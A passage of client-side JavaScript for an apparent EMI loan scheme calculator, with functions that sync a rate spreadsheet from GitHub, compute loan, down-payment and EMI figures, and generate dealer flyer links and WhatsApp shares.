function saveToDB(key, data) { return new Promise((resolve, reject) => { if (!dbInstance) return reject("DB not initialized"); try { let tx = dbInstance.transaction(STORE_NAME, 'readwrite'); let store = tx.objectStore(STORE_NAME); let req = store.put(JSON.stringify(data), key); req.onsuccess = () => resolve(); req.onerror = (e) => reject(e.target.error); } catch(e) { reject(e); } }); }
function getFromDB(key) { return new Promise((resolve, reject) => { if (!dbInstance) return resolve(null); try { let tx = dbInstance.transaction(STORE_NAME, 'readonly'); let store = tx.objectStore(STORE_NAME); let req = store.get(key); req.onsuccess = (e) => { let res = e.target.result; if (res) { if (typeof res === 'string') resolve(JSON.parse(res)); else resolve(res); } else { resolve(null); } }; req.onerror = (e) => reject(e.target.error); } catch(e) { reject(e); } }); }

let db_records = []; let dealer_records = []; let current_products = []; let sortConfigs = []; const SPECIAL_MODEL = "NON TIEUP"; let tempSheet1Data = []; let parsedSheet2Data = []; let customerQueue = []; let recycleBin = []; let activeCustomerIndex = -1; let selectedQueueIndex = -1; let tempPendingProduct = null; 
let currentViewedModel = "";

function highlightNumber(e, el) { if (e) e.stopPropagation(); let range = document.createRange(); range.selectNodeContents(el); let sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range); try { document.execCommand('copy'); } catch(err) {} }
function parseExcelDate(val) { if (!val) return null; if (typeof val === 'number') { return new Date(Math.round((val - 25569) * 86400 * 1000)); } if (typeof val === 'string') { let d = new Date(val); if (!isNaN(d.getTime())) return d; let parts = val.split(/[\/\-\.]/); if (parts.length === 3) { let y = parts[2].length === 2 ? '20' + parts[2] : parts[2]; return new Date(y, parts[1] - 1, parts[0]); } } return null; }

async function saveQueueToLocal(shouldCloudSync = true) { try { let compactQueue = customerQueue.map(c => { let cp = (c.products || []).map(p => { let { calculatedData, allSchemes, ...keepProduct } = p; return keepProduct; }); return { ...c, products: cp }; }); localStorage.setItem('persistent_queue_backup', JSON.stringify(compactQueue)); localStorage.setItem('persistent_active_idx_backup', activeCustomerIndex); await saveToDB('persistent_queue', compactQueue); await saveToDB('persistent_active_idx', activeCustomerIndex); if(shouldCloudSync && loggedInUserEmail) { triggerSilentCloudSync(); } } catch(e) { console.error("Local Save Interrupted", e); } }

async function fetchFromMasterStream() {
    let statusBadge = document.getElementById('gitStatusBadge'); if(statusBadge) { statusBadge.innerHTML = '🔄 CHECKING UPDATES...'; statusBadge.style.color = '#f39c12'; statusBadge.style.borderColor = '#f39c12'; statusBadge.style.background = 'rgba(243, 156, 18, 0.15)'; }
    try {
        let apiRes = await fetch(GITHUB_API_URL); if (!apiRes.ok) throw new Error("API Limit Reached or Repo Error");
        let apiData = await apiRes.json(); if (!apiData || apiData.length === 0) throw new Error("No commits found for file.");
        let latestSha = apiData[0].sha; let savedSha = localStorage.getItem('persistent_master_sha'); let savedDB = await getFromDB("persistent_db"); let isDbEmpty = (!savedDB || savedDB.length === 0);
        if (latestSha === savedSha && !isDbEmpty) { if(statusBadge) { statusBadge.innerHTML = '✅ SYSTEM OPTIMIZED (FAST LOAD)'; statusBadge.style.color = 'var(--success)'; statusBadge.style.borderColor = 'var(--success)'; statusBadge.style.background = 'rgba(39, 174, 96, 0.15)'; } return; }
        if (statusBadge) statusBadge.innerHTML = '⬇️ DOWNLOADING NEW RATES...';
        let cacheBusterUrl = GITHUB_RAW_URL + '?t=' + Date.now(); let res = await fetch(cacheBusterUrl); if (!res.ok) throw new Error("File not deployed inside path setup yet.");
        let dataBuffer = await res.arrayBuffer(); let wb = XLSX.read(new Uint8Array(dataBuffer), { type: 'array' });
        tempSheet1Data = XLSX.utils.sheet_to_json(wb.Sheets[wb.SheetNames[0]], { raw: false, defval: "" }); parsedSheet2Data = wb.SheetNames.length > 1 ? XLSX.utils.sheet_to_json(wb.Sheets[wb.SheetNames[1]], { raw: false, defval: "" }).map(r => mapData(r, SPECIAL_MODEL)).filter(x => x && x.model && x.model.trim() !== "") : [];
        if (wb.SheetNames.length > 2) { dealer_records = XLSX.utils.sheet_to_json(wb.Sheets[wb.SheetNames[2]], { raw: false, defval: "" }); await saveToDB("persistent_dealers", dealer_records); }
        let filteredSheet1 = tempSheet1Data.map(r => mapData(r, "REG")).filter(m => m && m.model && m.model.trim() !== ""); let rawCombined = [...filteredSheet1, ...parsedSheet2Data]; let uniqueDB = []; let seenDB = new Set();
        rawCombined.forEach(r => { let key = `${r.model}_${r.category}_${r.tenure}_${r.advEmi}_${r.fixedEmi}_${r.minLoan}_${r.maxLoan}`; if (!seenDB.has(key)) { seenDB.add(key); uniqueDB.push(r); } });
        if (uniqueDB.length > 0) { db_records = uniqueDB; await saveToDB("persistent_db", db_records); localStorage.setItem('persistent_master_sha', latestSha); if (activeCustomerIndex !== -1) { loadCurrentProducts(); renderMatrix(); } }
        if(statusBadge) { statusBadge.innerHTML = '✅ MASTER DATA SYNCED'; statusBadge.style.color = 'var(--success)'; statusBadge.style.borderColor = 'var(--success)'; statusBadge.style.background = 'rgba(39, 174, 96, 0.15)'; }
    } catch(err) { console.error("Smart Version Check Error: ", err); if(statusBadge) { statusBadge.innerHTML = '⚠️ OFFLINE MODE (USING LOCAL DATA)'; statusBadge.style.color = 'var(--danger)'; statusBadge.style.borderColor = 'var(--danger)'; statusBadge.style.background = 'rgba(214, 48, 49, 0.15)'; } }
}

window.onload = async function() {
    if(loggedInUserEmail) { let savedName = localStorage.getItem('persistent_user_name') || "User"; updateLoginUI(savedName, true); } generateStackCards(); 
    try {
        await initDB(); 
        let savedDB = await getFromDB("persistent_db"); 
        if (savedDB && savedDB.length > 0) { 
            let today = new Date(); today.setHours(0,0,0,0);
            db_records = savedDB.filter(r => {
                if(!r.expiryDateStr) return true;
                let p = r.expiryDateStr.split('/');
                if(p.length !== 3) return true;
                let expD = new Date(p[2], p[1]-1, p[0]);
                return expD >= today;
            });
        }
        let savedDealers = await getFromDB("persistent_dealers"); if (savedDealers && savedDealers.length > 0) { dealer_records = savedDealers; }
        await fetchFromMasterStream();
        let savedQ = await getFromDB('persistent_queue'); if (!savedQ || savedQ.length === 0) { let lsQ = localStorage.getItem('persistent_queue_backup'); if (lsQ) savedQ = JSON.parse(lsQ); }
        if (savedQ) { customerQueue = savedQ.map(c => ({ ...c, components: c.components || {}, products: c.products || [], sortConfigs: c.sortConfigs || [] })); }
        let savedRecycle = await getFromDB('persistent_recycle'); if (!savedRecycle || savedRecycle.length === 0) { let lsRec = localStorage.getItem('persistent_recycle_backup'); if (lsRec) savedRecycle = JSON.parse(lsRec); }
        if (savedRecycle) recycleBin = savedRecycle;
        let savedIdx = await getFromDB('persistent_active_idx'); if (savedIdx === null || savedIdx === undefined) { savedIdx = localStorage.getItem('persistent_active_idx_backup'); }
        if (savedIdx !== null && savedIdx !== undefined) activeCustomerIndex = parseInt(savedIdx); if(activeCustomerIndex >= customerQueue.length) activeCustomerIndex = -1;
        renderCustomerQueue(); updateUniversalActionButtons();
    } catch(e) { console.error("Local Data Initialization Failure", e); }
};

function openFlyerGenModal() { document.getElementById('fgSalesName').value = ''; document.getElementById('fgSalesMobile').value = ''; document.getElementById('fgDealerSearch').value = ''; document.getElementById('fgDealerList').innerHTML = ''; tempFgDealerId = ""; tempFgDealerName = ""; tempFgBitly = ""; clearFgModel(); document.getElementById('fgOfferType').value = 'NONE'; toggleFgOfferInput(); document.getElementById('fgSelectedDealerBox').style.display = 'none'; document.getElementById('flyerGeneratedLinkBox').style.display = 'none'; document.getElementById('flyerGenModal').style.display = 'flex'; }
function toggleFgOfferInput() { let type = document.getElementById('fgOfferType').value; let box = document.getElementById('fgOfferValBox'); let label = document.getElementById('fgOfferValLabel'); let inp = document.getElementById('fgOfferValue'); if(type === "NONE") { box.style.display = 'none'; inp.value = ''; } else if(type === "FREEBIE") { box.style.display = 'block'; label.innerText = "ENTER GIFT NAME"; inp.placeholder = "E.g. Earbuds / Smartwatch"; } else { box.style.display = 'block'; label.innerText = "ENTER UPTO AMOUNT (₹)"; inp.placeholder = "E.g. 2500"; } }
function searchFgDealer() { let q = document.getElementById('fgDealerSearch').value.toLowerCase().trim(); let list = document.getElementById('fgDealerList'); if(!q) { list.innerHTML = ''; return; } let matches = dealer_records.map(d => parseDealerObj(d)).filter(p => p.name.toLowerCase().includes(q) || p.code.toLowerCase().includes(q) || p.city.toLowerCase().includes(q)).slice(0, 10); list.innerHTML = matches.map(p => { let displayStr = `${p.name}${p.city ? ' - ' + p.city : ''} (${p.code})`; return `<div onclick="selectFgDealer('${p.code}', '${p.name.replace(/'/g, "\\'")}', '${p.city.replace(/'/g, "\\'")}', '${encodeURIComponent(p.bitly||'')}')" style="padding:8px; border-bottom:1px solid #eee; cursor:pointer; background:#fff; font-size:12px; font-weight:bold; color:var(--bajaj-blue);">🏪 ${displayStr}</div>`; }).join(''); }
function selectFgDealer(code, name, city, bitlyEnc) { tempFgDealerId = code; tempFgDealerName = `${name}${city ? ' - ' + city : ''}`; tempFgBitly = decodeURIComponent(bitlyEnc); document.getElementById('fgDealerSearch').value = ''; document.getElementById('fgDealerList').innerHTML = ''; document.getElementById('fgSelectedDealerBox').innerHTML = `✅ ${tempFgDealerName} [Code: ${code}] <span onclick="clearFgDealer()" style="color:red; cursor:pointer; float:right;">✖</span>`; document.getElementById('fgSelectedDealerBox').style.display = 'block'; }
function clearFgDealer() { tempFgDealerId = ""; tempFgDealerName = ""; tempFgBitly = ""; document.getElementById('fgSelectedDealerBox').style.display = 'none'; }
function searchFgModel() { let q = document.getElementById('fgModelSearch').value.toUpperCase().trim(); let list = document.getElementById('fgModelList'); if(!q) { list.innerHTML = ''; return; } let matches = [...new Set(db_records.filter(r => r.model !== SPECIAL_MODEL).map(r => r.model))].filter(m => m.includes(q)).slice(0,8); list.innerHTML = matches.map(m => `<div onclick="selectFgModel('${m.replace(/'/g, "\\'")}')" style="padding:8px; border-bottom:1px solid #eee; cursor:pointer; background:#fff; font-size:12px;">📱 ${m}</div>`).join(''); }
function selectFgModel(name) { tempFgModel = name; document.getElementById('fgModelSearch').value = ''; document.getElementById('fgModelList').innerHTML = ''; document.getElementById('fgSelectedModelBox').innerHTML = `📱 Locked: ${name} <span onclick="clearFgModel()" style="color:red; cursor:pointer; float:right;">✖</span>`; document.getElementById('fgSelectedModelBox').style.display = 'block'; }
function clearFgModel() { tempFgModel = ""; document.getElementById('fgSelectedModelBox').style.display = 'none'; }

function generateFlyer() {
    let sName = document.getElementById('fgSalesName').value.trim(); let sMob = document.getElementById('fgSalesMobile').value.trim(); let oType = document.getElementById('fgOfferType').value; let oVal = document.getElementById('fgOfferValue').value.trim();
    if(!sName || !sMob || sMob.length !== 10) { showToast("⚠️ Kripya Salesman Name aur 10-Digit Mobile Number barabar dalein!", "error"); return; }
    if(!tempFgDealerId) { showToast("⚠️ Kadak Niyam: Dealer Shop select karna Compulsory hai!", "error"); return; }
    if(!tempFgBitly) { showToast("⚠️ Is Dealer ki Bitly Link master data mein nahi mili!", "error"); return; }
    if(oType !== "NONE" && !oVal) { showToast("⚠️ Agar Offer select ki hai toh Amount ya Gift ka naam dalein!", "error"); return; }
    let baseUrl = window.location.href.split('?')[0]; baseUrl = baseUrl.replace(/index\.html?$/i, ''); if(!baseUrl.endsWith('/')) baseUrl += '/';
    let url = `${baseUrl}flyer.html?sn=${encodeURIComponent(sName)}&sm=${sMob}&did=${encodeURIComponent(tempFgDealerId)}&dn=${encodeURIComponent(tempFgDealerName)}&bl=${encodeURIComponent(tempFgBitly)}`;
    if(oType !== "NONE") url += `&ot=${encodeURIComponent(oType)}&ov=${encodeURIComponent(oVal)}`; if(tempFgModel) url += `&fm=${encodeURIComponent(tempFgModel)}`;
    document.getElementById('flyerGeneratedLinkBox').style.display = 'block'; document.getElementById('fgGeneratedLinkText').value = url;
}
function copyFlyerLink() { let copyText = document.getElementById('fgGeneratedLinkText'); copyText.select(); copyText.setSelectionRange(0, 99999); document.execCommand("copy"); showToast("✅ Link Copied!", "success"); }
function shareOnWhatsAppStatus() { let generatedLink = document.getElementById('fgGeneratedLinkText').value; if (!generatedLink) { showToast("⚠️ Pehle link generate karein!", "error"); return; } let statusMessage = "🔥 *Festival Special Offers!* 🔥\n\nNaya Mobile, Laptop ya TV lene ka soch rahe ho? Zero percent interest (0% EMI) par kharidi karein!\n\n" + generatedLink; let encodedMessage = encodeURIComponent(statusMessage); window.open(`https://wa.me/?text=${encodedMessage}`, '_blank'); }

function openDictionaryModal() { 
    if(!db_records || db_records.length === 0) { showToast("⚠️ Schemes Dictionary load ho rahi hai, kripya 2 second wait karein...", "warning"); return; } 
    document.getElementById('globalModelSearch').value = ''; 
    document.getElementById('globalModelDropdown').style.display = 'none'; 
    document.getElementById('schemeResultArea').style.display = 'none';

    if (activeCustomerIndex !== -1 && customerQueue[activeCustomerIndex]) {
        let c = customerQueue[activeCustomerIndex];
        document.getElementById('calcCustType').value = c.type || "NEW";
        document.getElementById('calcLimit').value = c.limit || "";
        document.getElementById('calcLtv').value = c.ltv || 100;
        document.getElementById('calcCap').value = c.cap || "";
    } else {
        document.getElementById('calcCustType').value = "NEW";
        document.getElementById('calcLimit').value = "";
        document.getElementById('calcLtv').value = "100";
        document.getElementById('calcCap').value = "";
    }

    document.getElementById('dictionarySearchModal').style.display = 'flex'; 
    setTimeout(() => document.getElementById('globalModelSearch').focus(), 100); 
}

function closeDictionaryModal() { document.getElementById('dictionarySearchModal').style.display = 'none'; }

function doGlobalSearch() { 
    let q = document.getElementById('globalModelSearch').value.toUpperCase().trim(); 
    let dd = document.getElementById('globalModelDropdown'); 
    if(!q) { dd.style.display='none'; return; } 
    let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL); 
    let matches = validRecords.filter(r => { let m = r.model || ""; let b = r.brand || ""; let c = r.category || ""; return m.includes(q) || b.includes(q) || c.includes(q); }).map(r => r.model); 
    matches = [...new Set(matches)].slice(0, 30); 
    if (matches.length === 0) { dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`; dd.style.display = 'block'; return; } 
    dd.innerHTML = matches.map(m => { 
        let rec = validRecords.find(x => x.model === m); 
        let catTag = rec && rec.category ? `<span style="font-size:10px; background:#e0e0e0; color:#333; padding:2px 6px; border-radius:4px; float:right;">📁 ${rec.category}</span>` : ''; 
        let brandTag = rec && rec.brand ? `<span style="font-size:10px; color:#0984e3; font-weight:900; margin-right:5px;">[${rec.brand}]</span>` : ''; 
        return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800; color:var(--dark); display:flex; justify-content:space-between; align-items:center;" onmouseover="this.style.background='#e3f2fd'" onmouseout="this.style.background='#fff'" onclick="viewGlobalModel('${m.replace(/'/g, "\\'")}')"> <span style="flex:1;">${brandTag}📱 ${m}</span> ${catTag} </div>`; 
    }).join(''); 
    dd.style.display = 'block'; 
}

function viewGlobalModel(name) {
    document.getElementById('globalModelSearch').value = name;
    document.getElementById('globalModelDropdown').style.display = 'none';
    currentViewedModel = name;

    let rec = db_records.find(r => r.model === name);
    if(rec && rec.mrp > 0) {
        document.getElementById('calcInvoice').value = rec.mrp;
    } else {
        document.getElementById('calcInvoice').value = "";
    }

    recalcCurrentModel();

    setTimeout(() => {
        let resultArea = document.getElementById('schemeResultArea');
        if(resultArea) resultArea.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 100);
}

function recalcCurrentModel() {
    if(currentViewedModel !== "") {
        renderTableModel();
    }
}

function renderTableModel() {
    let schemes = db_records.filter(r => r.model === currentViewedModel);
    if(schemes.length === 0) return;
    
    document.getElementById('globalViewerTitle').innerText = '📱 ' + currentViewedModel;
    
    let custType = document.getElementById('calcCustType').value;
    let ltvLimit = parseFloat(document.getElementById('calcLtv').value) || 100;
    let limit = parseFloat(document.getElementById('calcLimit').value) || 0;
    let invoice = parseFloat(document.getElementById('calcInvoice').value) || 0;
    let margin = parseFloat(document.getElementById('calcMargin').value) || 0;
    let targetDp = parseFloat(document.getElementById('calcTarget').value) || 0;
    let emiCap = parseFloat(document.getElementById('calcCap').value) || 0;
    
    let gtl = invoice > 100000 ? 2398 : (invoice > 50000 ? 1799 : (invoice > 30000 ? 1499 : (invoice > 10000 ? 1199 : (invoice > 0 ? 699 : 0))));
    
    let isCalculatedMode = (limit > 0 && invoice > 0);
    let fee = (custType === 'EMI CARD') ? 270 : (custType === 'W/O CARD' ? 320 : 850);

    let validSchemes = schemes.filter(s => s.tenure > 0 || s.fixedEmi > 0);
    
    let today = new Date(); today.setHours(0,0,0,0);
    validSchemes = validSchemes.filter(s => {
        if(!s.expiryDateStr) return true;
        let p = s.expiryDateStr.trim().split('/');
        if(p.length === 3) {
            let expD = new Date(p[2], p[1]-1, p[0]);
            if(expD < today) return false;
        }
        return true;
    });
    
    let thead = document.getElementById('tableHead');
    if (isCalculatedMode) {
        thead.innerHTML = `<tr><th style="background:#e3f2fd;">T/A</th><th style="background:#e3f2fd;">LTV%</th><th style="background:#e8f5e9; color:var(--success);">LOAN</th><th style="background:#fff3e0; color:#d35400;">DIFF (INV-LOAN)</th><th style="background:#e8f5e9; color:var(--success);">EST. DP</th><th style="background:#e3f2fd; color:var(--primary);">EMI</th><th style="background:#e3f2fd; color:var(--primary);">MONTHS</th><th>ACTION</th></tr>`;
    } else {
        thead.innerHTML = `<tr><th style="background:#e3f2fd;">T/A</th><th style="background:#e3f2fd;">LTV%</th><th style="background:#e3f2fd;">FIXED EMI</th><th style="background:#e3f2fd;">DBD%</th><th style="background:#e3f2fd;">ROI%</th><th style="background:#e3f2fd;">PF</th></tr>`;
    }

    validSchemes.forEach(s => { 
        s.calcLTV = s.tenure > 0 ? ((s.tenure - s.advEmi)/s.tenure)*100 : 0; 
        
        if (isCalculatedMode) {
            let nbfcMax = (limit * s.tenure) / (s.tenure - s.advEmi || 1);
            let finalLoan = 0, emi = 0, dp = 0, diff = 0;
            let dbdRate = (s.dbd * 1.18 / 100);
            let roiRate = s.roi / 1200;
            let roiRateDP = roiRate * s.advEmi;
            let inst = s.tenure - s.advEmi;
            if (inst < 1) inst = 1;
            
            if (s.fixedEmi > 0) {
                let maxTotalTenure = Math.floor(limit / s.fixedEmi) + s.advEmi;
                let currentTenure = Math.floor(invoice / s.fixedEmi);
                if(currentTenure > maxTotalTenure) currentTenure = maxTotalTenure;
                if(currentTenure < 1) currentTenure = 1;
                
                finalLoan = currentTenure * s.fixedEmi;
                
                if (targetDp > 0) {
                    let numerator = targetDp - invoice - (s.fixedEmi * s.advEmi) - s.pf - fee - margin;
                    let denominator = dbdRate + roiRateDP - 1;
                    let solvedLoan = numerator / denominator;
                    let solvedTenure = Math.floor(solvedLoan / s.fixedEmi);
                    if (solvedTenure > maxTotalTenure) solvedTenure = maxTotalTenure;
                    finalLoan = Math.max(0, solvedTenure * s.fixedEmi);
                }
                
                if (finalLoan > invoice) finalLoan = Math.floor(invoice/s.fixedEmi)*s.fixedEmi;
                currentTenure = Math.floor(finalLoan / s.fixedEmi) || 1;
                inst = currentTenure - s.advEmi;
                if(inst < 1) inst = 1;
                
                let roiInEmi = finalLoan * roiRate;
                emi = s.fixedEmi + (gtl / inst) + roiInEmi;
                
                let roiInDp = finalLoan * roiRateDP;
                dp = invoice - finalLoan + (s.fixedEmi * s.advEmi) + s.pf + fee + (finalLoan * dbdRate) + margin + roiInDp;
                s.currentTenure = currentTenure;
                s.calcInst = inst;
            } else {
                finalLoan = Math.min(nbfcMax, invoice);
                
                if (targetDp > 0) {
                    let advRate = s.advEmi / s.tenure; 
                    let numerator = targetDp - invoice - s.pf - fee - margin; 
                    let denominator = advRate + dbdRate + roiRateDP - 1; 
                    let solvedLoan = numerator / denominator; 
                    finalLoan = Math.min(finalLoan, Math.max(0, Math.floor(solvedLoan)));
                }

                if (invoice > 0 && finalLoan > invoice) {
                    finalLoan = invoice;
                }
                
                let baseEmi = finalLoan / s.tenure;
                if (baseEmi > 0 && baseEmi < 900) baseEmi = 900; 

                let roiInEmi = finalLoan * roiRate;
                emi = baseEmi + (gtl / inst) + roiInEmi;
                
                if (emiCap > 0 && emi > emiCap) {
                    finalLoan = (emiCap - (gtl / inst)) / ((1 / s.tenure) + roiRate);
                    if(finalLoan < 0) finalLoan = 0;
                    if (invoice > 0 && finalLoan > invoice) finalLoan = invoice; 
                    
                    baseEmi = finalLoan / s.tenure;
                    if (baseEmi > 0 && baseEmi < 900) baseEmi = 900;

                    roiInEmi = finalLoan * roiRate;
                    emi = baseEmi + (gtl / inst) + roiInEmi;
                }

                let roiInDp = finalLoan * roiRateDP;
                dp = invoice - finalLoan + (baseEmi * s.advEmi) + s.pf + fee + (finalLoan * dbdRate) + margin + roiInDp;
                s.currentTenure = s.tenure;
                s.calcInst = inst;
            }
            
            s.calcLoan = finalLoan;
            s.isInvalidLoan = (isCalculatedMode && invoice > 0 && (finalLoan < (invoice * 0.5)));

            diff = invoice - finalLoan;
            s.calcDiff = diff > 0 ? diff : 0;
            s.calcDp = Math.ceil(dp/10)*10;
            s.calcEmi = emi;
        }
    });

    validSchemes = validSchemes.filter(s => (s.fixedEmi > 0 || s.calcLTV <= ltvLimit) && !s.isInvalidLoan);

    if (isCalculatedMode) {
        validSchemes.sort((a,b) => a.calcDp - b.calcDp);
    } else {
        validSchemes.sort((a,b) => b.calcLTV - a.calcLTV);
    }
    
    let tbody = document.getElementById('globalViewerBody');
    tbody.innerHTML = validSchemes.map(s => {
        let displayTenure = s.currentTenure ? s.currentTenure : s.tenure;
        if (isCalculatedMode) {
            return `<tr>
                <td style="font-weight:900; color:var(--indigo); border-bottom:1px solid #eee;">${displayTenure}/${s.advEmi}</td>
                <td style="font-weight:bold; color:var(--bajaj-blue); border-bottom:1px solid #eee;">${Math.round(s.calcLTV)}%</td>
                <td style="border-bottom:1px solid #eee; background:#f4fcf6; color:var(--success); font-weight:900;">₹${Math.floor(s.calcLoan).toLocaleString()}</td>
                <td style="border-bottom:1px solid #eee; background:#fff3e0; color:#d35400; font-weight:900;">₹${Math.floor(s.calcDiff).toLocaleString()}</td>
                <td style="border-bottom:1px solid #eee; background:#f4fcf6; color:var(--success); font-weight:900;">₹${Math.round(s.calcDp).toLocaleString()}</td>
                <td style="border-bottom:1px solid #eee; background:#eef6ff; color:var(--primary); font-weight:900;">₹${Math.round(s.calcEmi).toLocaleString()}</td>
                <td style="font-weight:900; color:var(--primary); background:#eef6ff; border-bottom:1px solid #eee;">${s.calcInst}</td>
                <td style="border-bottom:1px solid #eee;"><button style="padding:4px 8px; font-size:10px !important; background:var(--primary); color:white; border:none; border-radius:3px; cursor:pointer;" onclick="copySingleScheme('${displayTenure}', '${s.advEmi}', '${s.calcLoan}', '${s.calcDp}', '${s.calcEmi}', '${s.fixedEmi}', '${s.dbd}', '${s.roi}', '${s.pf}', this)">COPY</button></td>
            </tr>`;
        } else {
            let dbdAmtPreview = invoice > 0 ? invoice * (s.dbd * 1.18 / 100) : 0;
            let dbdStr = invoice > 0 ? `${+parseFloat(s.dbd).toFixed(3)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(dbdAmtPreview).toLocaleString()}</span>` : `${+parseFloat(s.dbd).toFixed(3)}%`;

            return `<tr>
                <td style="font-weight:900; color:var(--indigo); border-bottom:1px solid #eee;">${displayTenure}/${s.advEmi}</td>
                <td style="font-weight:bold; color:var(--bajaj-blue); border-bottom:1px solid #eee;">${Math.round(s.calcLTV)}%</td>
                <td style="font-weight:900; color:var(--primary); border-bottom:1px solid #eee;">${s.fixedEmi > 0 ? '₹'+s.fixedEmi : 'N/A'}</td>
                <td style="border-bottom:1px solid #eee;">${dbdStr}</td>
                <td style="border-bottom:1px solid #eee;">${+parseFloat(s.roi).toFixed(2)}%</td>
                <td style="font-weight:900; border-bottom:1px solid #eee;">₹${s.pf}</td>
            </tr>`;
        }
    }).join('');
    
    document.getElementById('schemeResultArea').style.display = 'block';
}

function copySingleScheme(tenure, advEmi, loan, dp, emi, fixedEmi, dbd, roi, pf, btn) {
    let limit = parseFloat(document.getElementById('calcLimit').value) || 0;
    let invoice = parseFloat(document.getElementById('calcInvoice').value) || 0;
    let isCalculatedMode = (limit > 0 && invoice > 0);
    let inst = Math.max(1, parseInt(tenure) - parseInt(advEmi));

    let textToCopy = `📱 *${currentViewedModel}*\n`;

    if (isCalculatedMode) {
        textToCopy += `*INVOICE AMOUNT:* ₹${invoice}\n\n`;
        textToCopy += `✅ *Scheme:* ${tenure}/${advEmi}\n`;
        textToCopy += `💳 *Loan:* ₹${Math.floor(loan).toLocaleString()}\n`;
        textToCopy += `💰 *Net DP:* ₹${Math.round(dp).toLocaleString()}\n`;
        textToCopy += `🗓️ *EMI:* ₹${Math.round(emi).toLocaleString()} x ${inst} Months`;
    } else {
        textToCopy += `✅ *Scheme:* ${tenure}/${advEmi}\n`;
        if (fixedEmi > 0) textToCopy += `🗓️ *FIXED EMI:* ₹${fixedEmi}\n`;
        textToCopy += `*DBD:* ${parseFloat(dbd).toFixed(2)}% | *ROI:* ${parseFloat(roi).toFixed(2)}%\n`;
        textToCopy += `*PF:* ₹${pf}`;
    }

    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(textToCopy).then(() => {
            let orig = btn.innerText;
            btn.innerText = "COPIED!";
            btn.style.background = "var(--success)";
            setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; }, 2000);
        });
    }
}

function exportDictSchemeImage(action) {
    let titleText = document.getElementById('globalViewerTitle').innerText;
    let tableHtml = document.querySelector('#schemeResultArea table').outerHTML;

    let ltvLimit = document.getElementById('calcLtv').value || 100;
    let limit = document.getElementById('calcLimit').value;
    let invoice = parseFloat(document.getElementById('calcInvoice').value) || 0;
    let margin = parseFloat(document.getElementById('calcMargin').value) || 0;
    let targetDp = parseFloat(document.getElementById('calcTarget').value) || 0;
    let emiCap = parseFloat(document.getElementById('calcCap').value) || 0;
    let custType = document.getElementById('calcCustType').value;

    let extraStr = `Customer: ${custType} | LTV: ${ltvLimit}% | Limit: ₹${limit} | Invoice: ₹${invoice}`;
    if (margin > 0) extraStr += ` | Margin: ₹${margin}`;
    if (targetDp > 0) extraStr += ` | Target DP: ₹${targetDp}`;
    if (emiCap > 0) extraStr += ` | Cap: ₹${emiCap}`;

    let extraInfo = (limit && invoice) ? `<div style="background:#e8f5e9; color:#27ae60; padding:8px; border-radius:6px; margin-bottom:10px; font-weight:bold; font-size:14px; text-transform:uppercase;">${extraStr}</div>` : '';

    let exportDiv = document.createElement('div');
    exportDiv.style.width = "750px"; exportDiv.style.padding = "20px"; exportDiv.style.background = "#fff"; exportDiv.style.position = "absolute"; exportDiv.style.top = "-9999px";
    exportDiv.innerHTML = `<div style="border: 2px solid #2C3E50; border-radius: 10px; padding: 16px; background: #fff; font-family: sans-serif;"><div style="background: #2C3E50; color: white; padding: 12px; border-radius: 6px; margin-bottom: 14px; text-align: center;"><h3 style="margin:0; font-size: 17px; font-weight: 900;">${titleText}</h3></div>${extraInfo}${tableHtml}</div>`;
    document.body.appendChild(exportDiv);

    let clonedTable = exportDiv.querySelector('table');
    let actionCells = clonedTable.querySelectorAll('th:last-child, td:last-child');
    actionCells.forEach(cell => cell.remove());

    clonedTable.style.width = "100%"; clonedTable.style.borderCollapse = "collapse";
    exportDiv.querySelectorAll('th, td').forEach(cell => { cell.style.padding = "10px"; cell.style.borderBottom = "1px solid #ddd"; cell.style.textAlign = "center"; });

    html2canvas(exportDiv, { scale: 2, useCORS: true }).then(canvas => {
        document.body.removeChild(exportDiv);
        if (action === 'download') {
            let a = document.createElement('a'); a.href = canvas.toDataURL("image/png"); a.download = `Schemes.png`; a.click();
            showToast("✅ Image downloaded!", "success");
        } else {
            canvas.toBlob(blob => {
                navigator.clipboard.write([new ClipboardItem({ "image/png": blob })]).then(() => showToast("📋 Copied to clipboard!", "success")).catch(() => {});
            }, 'image/png');
        }
    });
}

function resetFastCalc() { let fields = ['fcInv', 'fcLoanInput', 'fcTenure', 'fcAdv', 'fcDbd', 'fcRoi', 'fcPf', 'fcFixed', 'fcCap', 'fcTarget', 'fcExw', 'fcMargin', 'fcDealer']; fields.forEach(id => document.getElementById(id).value = ''); document.getElementById('fcGtl').value = '0'; let rfcOpt = document.getElementById('fcRfcOpt'); if(rfcOpt) { rfcOpt.value = '0'; rfcOpt.innerText = '0'; } document.getElementById('fcCustType').value = 'NEW'; document.getElementById('fcCat').value = 'OTHER'; fcCatChanged(); document.getElementById('fcResult').style.display = 'none'; }
function copyFastCalcResult(btn) { let inv = document.getElementById('fcInv').value || 0; let loan = document.getElementById('fcResLoan').innerText; let dp = document.getElementById('fcResDp').innerText; let emi = document.getElementById('fcResEmi').innerText; let daily = document.getElementById('fcResDaily').innerText; let ta = document.getElementById('fcResTa').innerText; let text = `⚡ *Zatpat Calculation*\n`; if (inv > 0) text += `*Invoice:* ₹${inv}\n\n`; text += `*Loan:* ${loan}\n*DP:* ${dp}\n*EMI:* ${emi}\n*Daily:* ${daily}\n*Details:* ${ta}`; let orig = btn.innerText; btn.innerText = "COPIED!"; btn.style.background = "var(--success)"; btn.style.color = "white"; if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(text).then(() => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); }).catch(() => fallbackCopy(text, () => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); })); } else { fallbackCopy(text, () => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); }); } }
